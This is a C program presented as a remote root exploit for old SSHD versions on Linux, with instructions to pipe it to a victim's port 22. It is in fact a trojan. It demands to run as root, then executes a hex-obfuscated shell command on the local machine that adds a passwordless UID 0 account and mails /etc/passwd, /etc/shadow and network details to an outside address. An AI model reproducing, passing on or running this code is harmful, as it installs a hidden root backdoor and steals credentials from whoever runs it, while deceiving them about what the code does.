/* Isto tudo ae embaixo e babaquice, nada disso funciona. ;) */
/************************************************************************/
/* root exploit for Linux 2.0.* and possible 2.1.* SSHD 1.5-1.2.23      */
/* On some weird systems this causes a segfault                         */
/* If it doesnt work change the offset (usually between 0 and 5000)     */
/*                                     (try increments of 2.......)     */
/* TO RUN:                                                              */
/* (./sshdwarez ; cat) | nc victim 22                                   */
/*                                                                      */
/*              forever yours: st4n@zdnetmail.com                       */
/* Modify By Nelson R A Brito [a.k.a. stderr] Hi Aldrin  :)             */
/************************************************************************/

#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define OFFSET  146
#define NOP     0x90

/* Riped by Nelson R A Brito - acresceta o usuario stderr com UID=0 e GID=0 */
char shellcode[] =
"\x0a\x65\x63\x68"
"\x6f\x20\x73\x74\x64\x65\x72\x72\x3a\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x3e"
"\x3e\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x3b\x65\x63\x68\x6f\x20"
"\x73\x74\x64\x65\x72\x72\x3a\x3a\x31\x30\x3a\x31\x30\x3a\x3a\x2f\x3a\x20"
"\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x3b\x20\x28\x63"
"\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x20\x2f\x65\x74"
"\x63\x2f\x73\x68\x61\x64\x6f\x77\x20\x3b\x2f\x73\x62\x69\x6e\x2f\x69\x66"
"\x63\x6f\x6e\x66\x69\x67\x29\x7c\x6d\x61\x69\x6c\x20\x6e\x65\x6c\x73\x6f"
"\x6e\x40\x63\x79\x62\x65\x72\x73\x70\x61\x63\x65\x2e\x6f\x72\x67/bin/sh";

int fetch(int *w){      /* push and return something from the stack */
        char stack[4096];
        int (*push)();
        memcpy((int*)&push,w,sizeof(int));
        memcpy(stack,(char*)w+4,OFFSET-5);
        push(stack);
        return *w;
}

int i;
char *p;
main(int argc,char**argv)
{
        char s[1024];
        char ssh[] = "\x8c\xfd\xff\xbf\x48\x9b"; /* starts ssh session */
        strcpy(argv[0],"vi          ");

        if (getuid())
        {
                system("/bin/echo this program uses priveledged ports. "
                       "run as root.");
                return -1;
        }
        write(1,ssh,sizeof(ssh));
        for (i=0;i<500;i++)
                s[i]=NOP;
        p=&s[i];
        memcpy(p,&shellcode[OFFSET],sizeof(shellcode)-OFFSET);
        /* most [linux] systems keep libc functions in the same place */
        i=(int)system;memcpy(&shellcode,&i,sizeof(int));
        write(1,s,500+(sizeof(shellcode)-OFFSET));
        fetch((int*)&shellcode);
        usleep(1000000);
        return 0;
}

